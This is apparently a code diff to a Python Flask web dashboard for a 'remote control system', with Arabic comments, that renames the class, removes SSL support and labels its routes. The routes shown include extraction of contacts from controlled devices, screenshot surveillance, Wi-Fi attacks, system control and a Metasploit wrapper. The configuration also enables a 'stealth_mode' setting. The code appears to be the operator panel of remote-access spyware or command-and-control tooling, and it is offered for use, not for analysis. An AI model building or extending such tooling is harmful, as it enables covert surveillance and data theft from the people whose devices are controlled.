@@ -1,26 +1,23 @@
 #!/usr/bin/env python3
 """
-Advanced Remote Control System - Unified Web Dashboard
-Phase 3: Complete Web Interface with Real Integration
+Fixed Web Dashboard - Complete Web Interface
+Phase 3: Real Web Interface with Command Server Integration
 """
 
-import asyncio
 import json
 import logging
 import os
 import time
 import sqlite3
 import requests
-from datetime import datetime, timedelta
+from datetime import datetime
 from typing import Dict, List, Any, Optional
 from dataclasses import dataclass, asdict
-from pathlib import Path
 
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from flask_cors import CORS
 from werkzeug.security import generate_password_hash, check_password_hash
-import threading
 
 # إعدادات النظام
 SECURITY_CONFIG = {
@@ -28,8 +25,8 @@ SECURITY_CONFIG = {
     'enable_rate_limit': True,
     'enable_logging': True,
     'max_devices_per_user': 10,
-    'session_timeout': 3600,  # ساعة واحدة
-    'command_timeout': 30,    # 30 ثانية
+    'session_timeout': 3600,
+    'command_timeout': 30,
     'stealth_mode': True,
     'persistent_storage': True,
     'auto_reconnect': True
@@ -41,8 +38,6 @@ class DashboardConfig:
     host: str = "0.0.0.0"
     port: int = 8081
     ssl_enabled: bool = False
-    ssl_cert: str = "certificates/server.crt"
-    ssl_key: str = "certificates/server.key"
     debug: bool = False
     max_connections: int = 100
     session_timeout: int = 3600
@@ -376,8 +371,8 @@ class WebCommandExecutor:
             self.logger.error(f"خطأ غير متوقع في جلب الأجهزة: {str(e)}")
             return {'error': f'خطأ غير متوقع: {str(e)}'}
 
-class UnifiedWebDashboard:
-    """لوحة التحكم الموحدة للويب"""
+class FixedWebDashboard:
+    """لوحة التحكم المصلحة للويب"""
     
     def __init__(self, config: DashboardConfig):
         self.config = config
@@ -414,7 +409,7 @@ class UnifiedWebDashboard:
         self._setup_routes()
         self._setup_socket_events()
         
-        self.logger.info("✅ تم تهيئة لوحة التحكم الموحدة")
+        self.logger.info("✅ تم تهيئة لوحة التحكم المصلحة")
     
     def _setup_logging(self) -> logging.Logger:
         """إعداد التسجيل"""
@@ -463,14 +458,14 @@ class UnifiedWebDashboard:
             session.clear()
             return redirect(url_for('login'))
         
-        # API Routes
+        # API Routes - جميع الوظائف الحقيقية
         @self.app.route('/api/devices')
         def get_devices():
             """الحصول على الأجهزة"""
             if 'user_id' not in session:
                 return jsonify({"error": "غير مصرح"}), 401
             
-            devices = self.device_manager.get_user_devices(1)  # user_id = 1 for now
+            devices = self.device_manager.get_user_devices(1)
             return jsonify({
                 "success": True,
                 "devices": [asdict(device) for device in devices]
@@ -513,6 +508,7 @@ class UnifiedWebDashboard:
             
             return jsonify(result)
         
+        # Data Extraction APIs
         @self.app.route('/api/data/contacts', methods=['POST'])
         def extract_contacts():
             """استخراج جهات الاتصال"""
@@ -573,6 +569,7 @@ class UnifiedWebDashboard:
             
             return jsonify(result)
         
+        # Surveillance APIs
         @self.app.route('/api/surveillance/screenshot', methods=['POST'])
         def take_screenshot():
             """التقاط لقطة شاشة"""
@@ -612,6 +609,7 @@ class UnifiedWebDashboard:
             
             return jsonify(result)
         
+        # Attack APIs
         @self.app.route('/api/attacks/wifi', methods=['POST'])
         def wifi_attack():
             """هجوم الواي فاي"""
@@ -652,6 +650,7 @@ class UnifiedWebDashboard:
             
             return jsonify(result)
         
+        # System Control APIs
         @self.app.route('/api/system/info', methods=['POST'])
         def get_system_info():
             """الحصول على معلومات النظام"""
@@ -688,6 +687,7 @@ class UnifiedWebDashboard:
             
             return jsonify(result)
         
+        # Tools APIs
         @self.app.route('/api/tools/metasploit', methods=['POST'])
         def metasploit_tool():
             """أداة Metasploit"""
@@ -747,30 +747,21 @@ class UnifiedWebDashboard:
     def run(self):
         """تشغيل الخادم"""
         try:
-            self.logger.info(f"🚀 بدء لوحة التحكم الموحدة على {self.config.host}:{self.config.port}")
+            self.logger.info(f"🚀 بدء لوحة التحكم المصلحة على {self.config.host}:{self.config.port}")
             
-            if self.config.ssl_enabled:
-                self.socketio.run(
-                    self.app,
-                    host=self.config.host,
-                    port=self.config.port,
-                    ssl_context=(self.config.ssl_cert, self.config.ssl_key),
-                    debug=self.config.debug
-                )
-            else:
-                self.socketio.run(
-                    self.app,
-                    host=self.config.host,
-                    port=self.config.port,
-                    debug=self.config.debug
-                )
+            self.socketio.run(
+                self.app,
+                host=self.config.host,
+                port=self.config.port,
+                debug=self.config.debug
+            )
         except Exception as e:
             self.logger.error(f"❌ خطأ في تشغيل الخادم: {e}")
 
 def main():
     """الدالة الرئيسية"""
     config = DashboardConfig()
-    dashboard = UnifiedWebDashboard(config)
+    dashboard = FixedWebDashboard(config)
     dashboard.run()
 
 if __name__ == "__main__":
